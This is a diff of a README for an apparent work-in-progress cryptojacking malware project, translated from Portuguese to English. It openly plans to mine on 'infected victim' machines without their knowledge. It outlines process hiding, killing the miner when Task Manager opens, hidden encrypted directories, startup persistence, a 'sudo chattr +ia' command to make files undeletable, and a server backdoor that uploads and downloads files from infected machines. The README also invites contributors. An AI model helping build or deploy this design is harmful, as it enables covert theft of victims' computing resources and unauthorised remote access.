@@ -1,69 +1,56 @@
 # CryptoMining  (WORK IN PROGRESS)
 
-Este programa não está pronto, nem perto de estar funcionalmente pronto.
+This program isn't ready, I'm developing it everyday. Feel free to join the development of this cryptominer with code or ideas.
+
+Help is welcome!
+
+# Ideias
+
+Premisses:
+* Multiple Miners 
+* less third-parties libraries possible 
+* Cryptography to secure client-server communication 
+* create hidden/secure directory to store settings and info about the mining process
+* Process hiding and obfuscation / Persistence 
 
 
-# IDEIAS
-
-Premissas:
-* vários mineradores 
-* usar menor quantidade de biblioteca possível 
-* utilizar criptografia para assegurar segurança 
-* Criar diretorio escondido e protegido com dados criptografados sobre o BTC 
-
+# Client side
 
 **cgminer** pool name 
 
-Hardcoded encrypted :server e porta e pool de conexão criptogtafados 
+Hardcoded encrypted :server, port and mining pool info 
 
-Pegar ID do Minerador e enviar pro Server, dizendo que ele está trabalhando 
+The server has to aknowledge new miners.  
 
-Novos mineradores enviam pro Server dizendo que é novo 
+check if task manager is open 
 
-Criar pasta oculta pro vírus com os dados do Mineiro e pool 
+Infected victim should not know or find about the cryptominer
 
-Toda comunicação entre servidor e mineiro é criptografada RSA 
-
-Criar entrada no registro para minerar p sempre, mesmo com o desligamento da maquina (persistência)
-
-Thread p checar task Manager 
-Maquina mineira não pode descobrir que o processo está rodando, process hiding 
-
+''
 global bool lock_taskmanager = false; 
 while(!lock_taskmanager){
      Check 
 }
 continue mining 
+''
 
 Malware + cgminer 
 
-1 processo pai para comunicar com o Server e checar taskmanager , spawna um processo filho cgminer p minerar 
+One process is responsible for server communication and checking task manager, while the child process will only mine.
 
-Troca de dados entre cliente e servidor via protocolo http, json encryptado 
+If the task manager is opened, the child process is killed. When closed, child will be respawned.
 
-Mineiro avisa de 5 em 5 minutos pro Server que esta minerando 
-
-*Mineiro envia dados da maquina, para o servidor saber quanto aquela maquina consegue minerar*
-
-**servidor**
-
-Multithreaded Http server que concorda na troca de chave de criptografia com o cliente 
-
-Recebe os dados do cliente : id do mineiro 
-
-Cria pasta no servidor para cada mineiro com dados de quanto tempo ficou minerando 
-
-
-**file persistence**
-
-    Open miner everytime the CPU startup
-
+**file persistence and undeleted files**
+    
     if(root){
         system("sudo chattr +ia file");
     }
 
-CLIENT VAI CRIAR UMA THREAD PRA TENTAR FICAR SE CONECTANDO COM O SERVIDOR 
 
-SE CONSEGUIR SE CONECAR, FICA ENVIANDO INFORMAÇÕES PRO SERVIDOR
+# Server side
 
-SE NÃO CONSEGUIR SE CONECTAR, ELE APENAS CONTINUA MINERANDO
+Multithreaded c++ server from scratch, will accept new miners. get info from miners, and will have direct access to the victim machine from a backdoor.
+
+Also will be capable of sending files and downloading files from the infected machine. 
+
+Every new miner will have an directory, containing info about the mining time, logs, Keys used to secure communication(cryptography), etc.
